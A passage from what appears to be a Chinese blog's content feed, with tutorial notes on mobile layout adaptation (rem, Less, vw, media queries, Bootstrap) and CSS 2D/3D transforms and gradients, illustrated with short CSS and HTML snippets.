title="适配方案"></a>适配方案</h2><ul><li><p>宽度适配：宽度自适应</p><ul><li>百分比布局</li><li>Flex 布局</li></ul></li><li><p>等比适配：宽高等比缩放</p><ul><li>rem</li><li>vw</li></ul></li></ul><h1 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>rem单位，是相对单位</li><li>rem单位是相对于HTML标签的字号计算结果</li><li>1rem &#x3D; 1HTML字号大小</li></ul><h2 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h2><p>媒体查询能够检测视口的宽度，然后编写差异化的 CSS 样式<br>当某个条件成立, 执行对应的CSS样式</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681811369469.png" alt="1681811369469.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">width</span>:<span class="number">320px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="rem-布局"><a href="#rem-布局" class="headerlink" title="rem 布局"></a>rem 布局</h2><p>目前rem布局方案中，将网页等分成10份， HTML标签的字号为视口宽度的 1&#x2F;10。</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681811438512.png" alt="1681811438512.png"></p><h2 id="flexible-js"><a href="#flexible-js" class="headerlink" title="flexible.js"></a>flexible.js</h2><p><code>flexible.js</code>是手机淘宝团队开发出的一个用来适配移动端的 js 库。<br>核心原理就是根据不同的视口宽度给网页中 html 根节点设置不同的 font-size。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">  ......</span><br><span class="line">  &lt;script <span class="attribute">src</span>=&quot;./js/flexible<span class="selector-class">.js</span>&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/<span class="selector-tag">body</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="rem-移动适配"><a href="#rem-移动适配" class="headerlink" title="rem 移动适配"></a>rem 移动适配</h2><p>rem单位尺寸</p><ol><li>确定基准根字号</li></ol><ul><li>查看设计稿宽度 → 确定参考设备宽度(视口宽度) → 确定基准根字号（1&#x2F;10视口宽度）</li></ul><ol start="2"><li>rem单位的尺寸</li></ol><ul><li><strong>rem单位的尺寸 &#x3D; px单位数值 &#x2F; 基准根字号</strong></li></ul><h1 id="less"><a href="#less" class="headerlink" title="less"></a>less</h1><p>Less是一个CSS预处理器, Less文件后缀是<code>.less</code>。扩充了 CSS 语言, 使 CSS 具备一定的逻辑性、计算能力</p><p>注意：浏览器不识别 Less 代码，目前阶段，网页要引入对应的 CSS 文件</p><p>VS Code 插件：<code>Easy LESS</code>，保存 less文件后自动生成对应的 CSS 文件</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul><li><p>单行注释</p><ul><li>语法：<code>// 注释内容</code></li><li>快捷键：ctrl + &#x2F;</li></ul></li><li><p>块注释</p><ul><li>语法：<code>/* 注释内容 */</code></li><li>快捷键： Shift + Alt + A</li></ul></li></ul><h2 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h2><ul><li>加、减、乘直接书写计算表达式</li><li>除法需要添加 <code>(小括号)</code> 或 <code>.</code></li><li>表达式存在多个单位以第一个单位为准</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681811616094.png" alt="1681811616094.png"></p><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p>作用：快速生成后代选择器<br>用 <code>&amp;</code> 表示当前选择器，不会生成后代选择器，通常配合伪类或伪元素使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: red; <span class="comment">/*父级样式*/</span></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>; <span class="comment">/*子级样式*/</span></span><br><span class="line">&#125;</span><br><span class="line">&amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>概念：容器，存储数据<br>作用：存储数据，方便使用和修改<br>语法：</p><ul><li>定义变量：@变量名: 数据;</li><li>使用变量：CSS属性：@变量名;</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 定义变量</span><br><span class="line"><span class="keyword">@myColor</span>: pink;</span><br><span class="line">// 使用变量</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: @myColor;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: @myColor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h2><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>作用：导入 less 公共样式文件<br>语法：导入: <code>@import “文件路径”</code>;<br>提示：如果是 less 文件可以省略后缀</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&#x27;./base.less&#x27;</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">&#x27;./common&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>写法：在 less 文件的第一行添加 <code>// out: 存储URL</code><br>提示：文件夹名称后面添加 <code>/</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// out: ./index.css</span><br><span class="line">// out: ./css/</span><br></pre></td></tr></table></figure><h3 id="禁止导出"><a href="#禁止导出" class="headerlink" title="禁止导出"></a>禁止导出</h3><p>写法：在 less 文件第一行添加:  <code>// out: false</code></p><h1 id="vw"><a href="#vw" class="headerlink" title="vw"></a>vw</h1><h2 id="vw和vh基本使用"><a href="#vw和vh基本使用" class="headerlink" title="vw和vh基本使用"></a>vw和vh基本使用</h2><p>vw和vh是相对单位，<strong>相对视口尺寸</strong>计算结果</p><ul><li>vw：<code>viewport width</code>（1vw &#x3D; 1&#x2F;100视口宽度 ）</li><li>vh：<code>viewport height</code> ( 1vh &#x3D; 1&#x2F;100视口高度 )</li></ul><h2 id="vw布局"><a href="#vw布局" class="headerlink" title="vw布局"></a>vw布局</h2><p>确定设计稿对应的vw尺寸（1&#x2F;100视口宽度）</p><ul><li>查看设计稿宽度 -&gt; 确定参考设备宽度（视口宽度） -&gt; 确定vw尺寸（1&#x2F;100视口宽度）</li></ul><p>vw单位的尺寸 &#x3D; px 单位数值 &#x2F; ( 1&#x2F;100 视口宽度 )</p><h2 id="vh问题"><a href="#vh问题" class="headerlink" title="vh问题"></a>vh问题</h2><ul><li>开发实践中，vw和vh不能混用</li><li>vh是1&#x2F;100视口高度，全面屏视口高度尺寸大，如果混用可能会导致盒子变形</li></ul><h1 id="响应式网页"><a href="#响应式网页" class="headerlink" title="响应式网页"></a>响应式网页</h1><h2 id="媒体查询-1"><a href="#媒体查询-1" class="headerlink" title="媒体查询"></a>媒体查询</h2><h3 id="基础写法"><a href="#基础写法" class="headerlink" title="基础写法"></a>基础写法</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681811369469.png" alt="1681811369469.png"></p><ul><li><code>max-width</code>：最大宽度（小于等于）</li><li><code>min-width</code>：最小宽度（大于等于）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*屏幕宽度小于等于320px*/</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">320px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*屏幕宽度大于等于320px*/</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>:<span class="number">320px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="书写顺序"><a href="#书写顺序" class="headerlink" title="书写顺序"></a>书写顺序</h3><blockquote><p>需求：</p><ul><li>默认网页背景色为灰色</li><li>屏幕宽度大于等于768px，为粉色</li><li>屏幕宽度大于等于992px，为绿色</li><li>屏幕宽度大于等于1200px，为skyblue</li></ul></blockquote><ul><li>min-width（从小到大）</li><li>max-width（从大到小）</li></ul><h3 id="完整写法"><a href="#完整写法" class="headerlink" title="完整写法"></a>完整写法</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682668186585.png" alt="1682668186585.png"></p><h4 id="关键词-逻辑操作符"><a href="#关键词-逻辑操作符" class="headerlink" title="关键词 &#x2F; 逻辑操作符"></a>关键词 &#x2F; 逻辑操作符</h4><ul><li><code>and</code></li><li><code>only</code></li><li><code>not</code></li></ul><h4 id="媒体类型"><a href="#媒体类型" class="headerlink" title="媒体类型"></a>媒体类型</h4><p>媒体类型用来区分设备类型</p><table><thead><tr><th>类型名称</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>屏幕</td><td>screen</td><td>带屏幕的设备</td></tr><tr><td>打印预览</td><td>print</td><td>打印预览模式</td></tr><tr><td>阅读器</td><td>speech</td><td>屏幕阅读模式</td></tr><tr><td>不区分类型</td><td>all</td><td>默认值，包括上述三种</td></tr></tbody></table><h4 id="媒体特性"><a href="#媒体特性" class="headerlink" title="媒体特性"></a>媒体特性</h4><table><thead><tr><th>特性名称</th><th>属性</th><th>值</th></tr></thead><tbody><tr><td>视口宽高</td><td>width、height</td><td>数值</td></tr><tr><td>视口最大宽高</td><td>max-width、max-height</td><td>数值</td></tr><tr><td>视口最小宽高</td><td>min-width、min-height</td><td>数值</td></tr><tr><td>屏幕方向</td><td>orientation</td><td>protrait：竖屏<br>landscape：横屏</td></tr></tbody></table><h3 id="外部CSS"><a href="#外部CSS" class="headerlink" title="外部CSS"></a>外部CSS</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--实际使用中，通常只写(媒体特性)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">media</span>=<span class="string">&quot;逻辑符 媒体类型 and (媒体特性)&quot;</span> <span class="attr">href</span>=<span class="string">&quot;xxx.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Bootstrap 是由 Twitter 公司（现在应该叫X）开发维护的前端 UI 框架，它提供了大量编写好的 CSS 样式，允许开发者结合一定 HTML 结构及JavaScript，快速编写功能完善的网页及常见交互效果。</p><p>中文官网：<a href="https://www.bootcss.com/">https://www.bootcss.com/</a><br>中文开发文档：<a href="https://v5.bootcss.com/docs/getting-started/introduction/">https://v5.bootcss.com/docs/getting-started/introduction/</a></p><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>下载：Bootstrap V5中文文档 → 进入中文文档 → 下载 →下载 Bootstrap 生产文件</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240125213636.png" alt="image.png"></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol><li>引入 Bootstrap CSS 文件</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./Bootstrap/css/bootstrap.min.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>调用类名： container 响应式布局版心类</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="栅格系统"><a href="#栅格系统" class="headerlink" title="栅格系统"></a>栅格系统</h3><p>作用：响应式布局</p><p>栅格化是指将整个网页的宽度分成<code>12等份</code>，每个盒子占用的对应的份数</p><p>例如：一行排4个盒子，则每个盒子占 3份 即可（12 &#x2F; 4 &#x3D; 3）</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682668611644.png" alt="1682668611644.png"></p><ul><li><code>col-*-*</code>：列（例如：col-xxl-3，表示在xxl的宽度占3份）</li><li><code>row</code>：行，可以让内容在一行排（flex布局）</li></ul><h3 id="全局样式"><a href="#全局样式" class="headerlink" title="全局样式"></a>全局样式</h3><h4 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h4><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682668666364.png" alt="1682668666364.png"><br>类名</p><ul><li><code>btn</code>：默认样式</li><li><code>btn-success</code>：成功</li><li><code>btn-warning</code>：警告</li><li>……</li><li>按钮尺寸：<code>btn-lg</code> &#x2F; <code>btn-sm</code></li></ul><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682668706851.png" alt="1682668706851.png"><br>表格类：</p><ul><li><code>table</code>：默认样式</li><li><code>table-striped</code>：隔行变色</li><li><code>table-success</code>：表格颜色</li><li>……</li></ul><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><ol><li><p>引入样式表</p></li><li><p>引入 js 文件</p></li><li><p>复制结构，修改内容</p></li></ol><h3 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h3><h4 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h4><p>导航 &#x2F; Extend：图标库 → 安装 → 下载安装包 → <a href="https://github.com/twbs/icons/releases/download/v1.10.3/bootstrap-icons-1.10.3.zip">bootstrap-icons-1.X.X.zip</a></p><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><ol><li>复制 fonts 文件夹到项目目录</li><li>网页引入 bootstrap-icons.css 文件</li><li>调用 CSS 类名（图标对应的类名）</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;bi-android2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> 前端基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> css </tag>
            
            <tag> html </tag>
            
            <tag> 移动端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS用法（二）</title>
      <link href="/2024/01/23/CSS%E7%94%A8%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2024/01/23/CSS%E7%94%A8%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="平面转换"><a href="#平面转换" class="headerlink" title="平面转换"></a>平面转换</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>作用：为元素添加动态效果，一般与过渡配合使用<br>概念：改变盒子在平面内的形态（位移、旋转、缩放、倾斜）</p><h2 id="平移"><a href="#平移" class="headerlink" title="平移"></a>平移</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(X轴移动距离, Y轴移动距离);</span><br></pre></td></tr></table></figure><ul><li>取值<ul><li>像素单位数值</li><li>百分比（参照<strong>盒子自身尺寸</strong>计算结果）</li><li><strong>正负</strong>均可</li></ul></li><li>技巧<ul><li><code>translate()</code> <strong>只写一个值</strong>，表示沿着 <strong>X</strong> 轴移动</li><li>单独设置 X 或 Y 轴移动距离：<code>translateX()</code> 或 <code>translateY()</code></li></ul></li></ul><p><strong>平移实现定位居中：</strong></p><ul><li>方法一：<code>margin</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: -<span class="number">100px</span>;</span><br><span class="line"><span class="attribute">margin-top</span>: -<span class="number">50px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br></pre></td></tr></table></figure><ul><li>方法二：平移 → 百分比参照盒子自身尺寸计算结果</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br></pre></td></tr></table></figure><p><strong>双开门案例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--HTML--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*CSS*/</span></span><br><span class="line">* &#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">1366px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">bg.jpg</span>);</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.father</span> <span class="selector-class">.left</span>,</span><br><span class="line"><span class="selector-class">.father</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">fm.jpg</span>);</span><br><span class="line"><span class="attribute">transition</span>: all <span class="number">0.5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.father</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line"><span class="attribute">background-position</span>: right <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.father</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.left</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">100%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.father</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">100%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(旋转角度);</span><br></pre></td></tr></table></figure><ul><li>取值：角度单位是 <strong>deg</strong></li><li>技巧<ul><li>取值正负均可</li><li>取值为正，顺时针旋转</li><li>取值为负，逆时针旋转</li></ul></li></ul><p><strong>转换原点：</strong></p><p>默认情况下，转换原点是盒子中心点</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform-origin</span>: 水平原点位置 垂直原点位置;</span><br></pre></td></tr></table></figure><p>取值：</p><ul><li><strong>方位名词</strong>（<code>left</code>、<code>top</code>、<code>right</code>、<code>bottom</code>、<code>center</code>）</li><li>像素单位数值</li><li>百分比</li></ul><h2 id="多重转换"><a href="#多重转换" class="headerlink" title="多重转换"></a>多重转换</h2><p>多重转换技巧：<strong>先平移再旋转</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>() <span class="built_in">rotate</span>(); <span class="comment">/*translate为平移，rotate为旋转</span></span><br></pre></td></tr></table></figure><ul><li>多重转换原理：以第一种转换方式坐标轴为准转换形态<ul><li>旋转会改变网页元素的坐标轴向</li><li>先写旋转，则后面的转换效果的轴向以旋转后的轴向为准，会影响转换结果</li></ul></li></ul><p>可以实现轮胎效果</p><h2 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">scale</span>(缩放倍数);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">scale</span>(X轴缩放倍数, Y轴缩放倍数);</span><br></pre></td></tr></table></figure><ul><li>技巧<ul><li>通常，只为 scale() 设置一个值，表示 X 轴和 Y 轴等比例缩放</li><li>取值大于1表示放大，取值小于1表示缩小</li></ul></li></ul><p>可以实现鼠标放置时放大的效果</p><h2 id="倾斜"><a href="#倾斜" class="headerlink" title="倾斜"></a>倾斜</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">skew</span>();</span><br></pre></td></tr></table></figure><p>取值：角度度数 <code>deg</code></p><h1 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h1><p>渐变是多个颜色<strong>逐渐变化</strong>的效果，一般用于设置盒子背景<br>分类：</p><ul><li>线性渐变<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681358603090.png" alt="1681358603090.png"></li><li>径向渐变<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681358608036.png" alt="1681358608036.png"></li></ul><h2 id="线性渐变"><a href="#线性渐变" class="headerlink" title="线性渐变"></a>线性渐变</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(</span><br><span class="line">  to 渐变方向,</span><br><span class="line">  颜色<span class="number">1</span> 终点位置,</span><br><span class="line">  颜色<span class="number">2</span> 终点位置,</span><br><span class="line">  ......</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>取值：</p><ul><li>渐变方向：可选<ul><li>to 方位名词</li><li>角度度数</li></ul></li><li>终点位置：可选<ul><li>百分比</li></ul></li></ul><h2 id="径向渐变"><a href="#径向渐变" class="headerlink" title="径向渐变"></a>径向渐变</h2><p>给按钮添加<strong>高光</strong>效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(</span><br><span class="line">  半径 at 圆心位置,</span><br><span class="line">  颜色<span class="number">1</span> 终点位置,</span><br><span class="line">  颜色<span class="number">2</span> 终点位置,</span><br><span class="line">  ......</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>取值：</p><ul><li>半径可以是<strong>2条</strong>，则为<strong>椭圆</strong></li><li>圆心位置取值：像素单位数值 &#x2F; 百分比 &#x2F; 方位名词</li></ul><h1 id="空间转换"><a href="#空间转换" class="headerlink" title="空间转换"></a>空间转换</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><ul><li>空间：是从坐标轴角度定义的 X 、Y 和 Z 三条坐标轴构成了一个立体空间，Z 轴位置与视线方向相同。</li><li>空间转换也叫 3D转换</li><li>属性：<code>transform</code></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723381377.png" alt="1681723381377.png"></p><h2 id="平移-1"><a href="#平移-1" class="headerlink" title="平移"></a>平移</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(x, y, z);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>();</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateY</span>();</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateZ</span>();</span><br></pre></td></tr></table></figure><ul><li>取值（<strong>正负</strong>均可）<ul><li>取值与平面转换相同</li></ul></li><li>默认情况下，Z 轴平移没有效果，原因：电脑屏幕默认是平面，无法显示 Z 轴平移效果</li></ul><h2 id="视距"><a href="#视距" class="headerlink" title="视距"></a>视距</h2><p>作用：指定了观察者与 Z&#x3D;0 平面的距离，为元素添加透视效果<br>透视效果：近大远小、近实远虚<br>属性：(添加给父级，取值范围 800-1200)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">perspective</span>: 视距;</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723504103.png" alt="1681723504103.png"></p><h2 id="旋转-1"><a href="#旋转-1" class="headerlink" title="旋转"></a>旋转</h2><ul><li><p>Z 轴：rotateZ()<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723547079.png" 